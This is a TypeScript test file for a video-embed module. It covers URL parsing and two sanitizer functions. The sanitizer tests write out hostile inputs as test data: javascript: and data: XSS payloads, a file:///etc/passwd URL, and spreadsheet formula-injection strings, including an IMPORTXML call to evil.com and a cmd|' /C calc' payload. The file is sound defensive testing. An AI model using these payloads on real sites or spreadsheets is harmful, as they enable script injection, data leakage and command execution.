import test from 'node:test';
import assert from 'node:assert/strict';
import {
  parseVideoUrl,
  extractGoogleDriveFileId,
  sanitizeSafeUrl,
  sanitizeSheetCell,
} from './videoEmbed';

test('parseVideoUrl parses YouTube watch, shorts, and youtu.be links with auto-thumbnails', () => {
  const watch = parseVideoUrl('https://www.youtube.com/watch?v=dQw4w9WgXcQ');
  assert.equal(watch.type, 'youtube');
  assert.ok(watch.embedUrl?.includes('dQw4w9WgXcQ'));
  assert.equal(watch.thumbnailUrl, 'https://i.ytimg.com/vi/dQw4w9WgXcQ/hqdefault.jpg');

  const short = parseVideoUrl('https://youtube.com/shorts/abc123xyz89');
  assert.equal(short.type, 'youtube');
  assert.ok(short.embedUrl?.includes('abc123xyz89'));
  assert.equal(short.thumbnailUrl, 'https://i.ytimg.com/vi/abc123xyz89/hqdefault.jpg');
});

test('parseVideoUrl parses Google Drive sharing and open?id links into preview embeds + thumbnails', () => {
  const shareUrl = 'https://drive.google.com/file/d/1aBcDeFgHiJkLmNoPqRsTuVwXyZ123456/view?usp=sharing';
  assert.equal(extractGoogleDriveFileId(shareUrl), '1aBcDeFgHiJkLmNoPqRsTuVwXyZ123456');

  const parsed = parseVideoUrl(shareUrl);
  assert.equal(parsed.type, 'gdrive');
  assert.equal(
    parsed.embedUrl,
    'https://drive.google.com/file/d/1aBcDeFgHiJkLmNoPqRsTuVwXyZ123456/preview'
  );
  assert.equal(
    parsed.thumbnailUrl,
    'https://drive.google.com/thumbnail?id=1aBcDeFgHiJkLmNoPqRsTuVwXyZ123456&sz=w720'
  );

  const openUrl = 'https://drive.google.com/open?id=9zYxWvUtSrQpOnMlKjIhGfEdCbA987654';
  const parsedOpen = parseVideoUrl(openUrl);
  assert.equal(parsedOpen.type, 'gdrive');
  assert.equal(
    parsedOpen.embedUrl,
    'https://drive.google.com/file/d/9zYxWvUtSrQpOnMlKjIhGfEdCbA987654/preview'
  );
});

test('parseVideoUrl parses Vimeo, MP4, and persistent desktop idb:// links', () => {
  const vimeo = parseVideoUrl('https://vimeo.com/123456789');
  assert.equal(vimeo.type, 'vimeo');
  assert.ok(vimeo.embedUrl?.includes('123456789'));

  const mp4 = parseVideoUrl('https://example.com/sample_reel.mp4');
  assert.equal(mp4.type, 'mp4');
  assert.equal(mp4.directUrl, 'https://example.com/sample_reel.mp4');

  const desktop = parseVideoUrl('idb://reel_local_12345');
  assert.equal(desktop.type, 'desktop');
  assert.equal(desktop.desktopId, 'reel_local_12345');
});

test('sanitizeSafeUrl blocks XSS protocols while allowing safe media URLs', () => {
  assert.equal(sanitizeSafeUrl('javascript:alert(1)'), '');
  assert.equal(sanitizeSafeUrl('JAVASCRIPT:void(0)'), '');
  assert.equal(sanitizeSafeUrl('data:text/html,<script>alert(1)</script>'), '');
  assert.equal(sanitizeSafeUrl('file:///etc/passwd'), '');
  assert.equal(sanitizeSafeUrl('https://youtu.be/dQw4w9WgXcQ'), 'https://youtu.be/dQw4w9WgXcQ');
  assert.equal(sanitizeSafeUrl('idb://video_99'), 'idb://video_99');
  assert.equal(
    parseVideoUrl('javascript:alert("xss")').type,
    'unknown'
  );
});

test('sanitizeSheetCell neutralizes Google Sheets / CSV formula injection payloads', () => {
  assert.equal(sanitizeSheetCell('=IMPORTXML("http://evil.com","//a")'), '\'=IMPORTXML("http://evil.com","//a")');
  assert.equal(sanitizeSheetCell('+cmd|\' /C calc\'!A0'), '\'+cmd|\' /C calc\'!A0');
  assert.equal(sanitizeSheetCell('-1+1'), '\'-1+1');
  assert.equal(sanitizeSheetCell('@SUM(A1:A5)'), '\'@SUM(A1:A5)');
  assert.equal(sanitizeSheetCell('Normal Client Name'), 'Normal Client Name');
});
